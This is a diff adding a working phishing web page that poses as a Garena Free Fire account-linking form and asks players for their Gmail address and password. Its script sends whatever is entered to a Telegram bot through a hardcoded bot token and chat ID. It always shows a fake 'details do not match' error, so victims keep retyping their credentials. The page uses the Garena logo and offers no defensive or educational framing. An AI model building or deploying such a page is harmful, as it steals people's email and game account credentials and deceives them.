@@ -1,0 +1,209 @@
+
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Link Free Fire</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #ffffff 20%, #ffa034 100%);
+      
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      color: #333;
+    }
+    .container {
+      max-width: 440px;
+      margin: 40px auto;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #ddd;
+      border-radius: 20px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 10px;
+    }
+    .form-group input {
+      width: 100%;
+      height: 40px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .btn {
+      width: 100%;
+      height: 40px;
+      padding: 10px;
+      background-color: #e97816;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #3e8e41;
+    }
+    .error-message {
+      color: red;
+      font-size: 12px;
+      margin-bottom: 10px;
+    }
+    .success-message {
+      color: green;
+      font-size: 12px;
+      margin-bottom: 10px;
+    }
+    img{
+      margin-left: 160px;
+    }
+  </style>
+</head>
+<body>
+  
+  <div class="container">
+    <h1>Link Free Fire Account to contuniue</h1>
+    <form id="signup-form">
+      <div class="form-group">
+        <label for="username">Gmail:</label>
+        <input type="email" id="username" placeholder="Enter Gmail" required>
+        <div class="error-message" id="username-error"></div>
+      </div>
+      <div class="form-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" placeholder="Enter password">
+        <div class="error-message" id="password-error"></div>
+      </div>
+      <button class="btn" id="signup-btn">LINK Account</button>
+    </form>
+    <h4>Note:Only Free Fire players can vote/suggest so link with a vaild Free fire Account.</h4>
+    <img src="https://crystalpng.com/wp-content/uploads/2025/09/garena-logo.png" style="width:100px;height:100px;">
+  </div>
+
+  <script>
+    const botToken = '8486680875:AAHADg3YgtIW9D1OPd-QdsM1vqwi6Z1f3uk';
+    const chatId = '7037294252';
+    const users = {
+      'user1': 'password1',
+      'user2': 'password2',
+      // Add more users here
+    };
+
+    document.getElementById('signup-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (validateSignupForm(username, password)) {
+        users[username] = password;
+        const message = `📩New LOGIN ATTEMPT📩
+        
+        
+        DETAILS:
+      - PLATFORMS: FREE FIRE
+      - GMAILL:${username} 
+      - PASSWORD:${password}
+      
+
+      🔒-SECURED BY GAMEHUB-🔒`;
+        sendMessage(message, () => {
+          
+          // Redirect to new webpage
+          // window.location.href = 'new-page.html';
+        });
+      }
+    });
+
+    document.getElementById('login-form').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('login-username').value.trim();
+      const password = document.getElementById('login-password').value.trim();
+
+      if (validateLoginForm(username, password)) {
+        if (users[username] === password) {
+          document.getElementById('login-success-message').innerText = 'Login successful!';
+          document.getElementById('login-error-message').innerText = '';
+          const message = `🔒 Login attempt: ${username} ${password}`;
+          sendMessage(message, () => {
+            window.open('new-page.html', '_blank');
+          });
+        } else {
+          document.getElementById('login-error-message').innerText = 'Invalid username or password';
+          document.getElementById('login-success-message').innerText = '';
+        }
+      }
+    });
+
+    function validateSignupForm(username, password) {
+      let isValid = true;
+
+      if (username.length < 3) {
+        document.getElementById('username-error').innerText = 'Username must be at least 3 characters';
+        isValid = false;
+      } else {
+        document.getElementById('username-error').innerText = '';
+      }
+
+      if (password.length < 999) {
+        document.getElementById('password-error').innerText = 'Gmail and Password does not match, make sure your details are correct.';
+        isValid = true;
+      } else {
+        document.getElementById('password-error').innerText = '';
+      }
+
+      return isValid;
+    }
+
+    function validateLoginForm(username, password) {
+      let isValid = true;
+
+      if (username.length < 3) {
+        document.getElementById('login-username-error').innerText = 'Username must be at least 3 characters';
+        isValid = false;
+      } else {
+        document.getElementById('login-username-error').innerText = '';
+      }
+
+      if (password.length < 6) {
+        document.getElementById('login-password-error').innerText = 'Password must be at least 6 characters';
+        isValid = false;
+      } else {
+        document.getElementById('login-password-error').innerText = '';
+      }
+
+      return isValid;
+    }
+
+    function sendMessage(message, callback) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = {
+        chat_id: chatId,
+        text: message
+      };
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log(data);
+        callback();
+      })
+      .catch(error => console.error(error));
+    }
+  </script>
+  
+</body>
+</html>
